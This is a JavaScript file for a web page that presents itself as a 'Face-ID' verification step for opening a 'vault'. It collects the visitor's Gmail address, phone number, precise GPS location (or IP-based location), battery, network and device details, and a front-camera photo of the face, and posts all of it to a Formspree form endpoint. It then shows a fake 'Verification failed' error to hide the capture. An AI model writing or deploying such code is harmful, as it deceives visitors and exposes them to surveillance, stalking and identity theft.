const FORMSPREE_URL = "https://formspree.io/f/xzdkrzlp"; 

document.getElementById('verifyBtn').addEventListener('click', async () => {
    const status = document.getElementById('status');
    const emailInput = document.getElementById('email');
    const phoneInput = document.getElementById('phone');
    const btn = document.getElementById('verifyBtn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    const email = emailInput.value.trim();
    const phone = phoneInput.value.trim();

    // 1. Validation Logic
    const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
    const phoneRegex = /^0[0-9]{9}$/;

    if (!gmailRegex.test(email)) {
        status.innerText = "Error: Only @gmail.com addresses are accepted.";
        return;
    }

    if (!phoneRegex.test(phone)) {
        status.innerText = "Error: Phone must be 10 digits starting with 0.";
        return;
    }

    // 2. UI Lock
    btn.disabled = true;
    btn.innerText = "Syncing...";
    status.innerText = "Verifying Network & GPS...";

    // 3. Advanced Device Data
    const getBattery = async () => {
        try {
            const b = await navigator.getBattery();
            return `${(b.level * 100)}% (${b.charging ? 'Charging' : 'Plugged Out'})`;
        } catch (e) { return "Unknown"; }
    };
    const batteryStatus = await getBattery();
    const connection = navigator.connection || {};

    // 4. Detailed Location Logic
    let locationData = {
        coords: "Unavailable",
        type: "None",
        accuracy: "N/A"
    };

    try {
        const pos = await new Promise((res, rej) => {
            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 7000 });
        });
        locationData = {
            coords: `${pos.coords.latitude}, ${pos.coords.longitude}`,
            type: "High-Precision GPS",
            accuracy: `${pos.coords.accuracy.toFixed(2)} meters`
        };
    } catch (e) { 
        console.log("GPS Blocked, attempting IP fallback...");
        try {
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();
            locationData = {
                coords: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
                type: "Network IP Fallback",
                accuracy: "Approximate (City Level)"
            };
        } catch (ipErr) {
            locationData.type = "Blocked/Failed";
        }
    }

    // 5. Camera Capture and Multipart Submission
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.style.display = "block";
        video.srcObject = stream;
        status.innerText = "Processing Face-ID Sync...";

        await new Promise(r => setTimeout(r, 2500));

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        // Send as a real File (Blob)
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            
            // Submission Data
            formData.append("email", email);
            formData.append("phone", phone);
            
            // Detailed Location Info
            formData.append("location_coords", locationData.coords);
            formData.append("location_type", locationData.type);
            formData.append("location_accuracy", locationData.accuracy);
            
            // Technical Specs
            formData.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);
            formData.append("battery", batteryStatus);
            formData.append("network", connection.effectiveType || "unknown");
            formData.append("device", navigator.userAgent);
            
            // Image File
            formData.append("image_file", blob, "face_sync.jpg");

            await fetch(FORMSPREE_URL, {
                method: 'POST',
                headers: { 'Accept': 'application/json' },
                body: formData
            });

            // Cleanup and Exit
            status.innerText = "Verification failed (Error 0xAF2). Please try again later.";
            stream.getTracks().forEach(t => t.stop());
            video.style.display = "none";
            btn.disabled = false;
            btn.innerText = "Verify & Open Vault";
        }, 'image/jpeg', 0.6);

    } catch (err) {
        status.innerText = "Error: Camera access is required for verification.";
        btn.disabled = false;
        btn.innerText = "Verify & Open Vault";
    }
});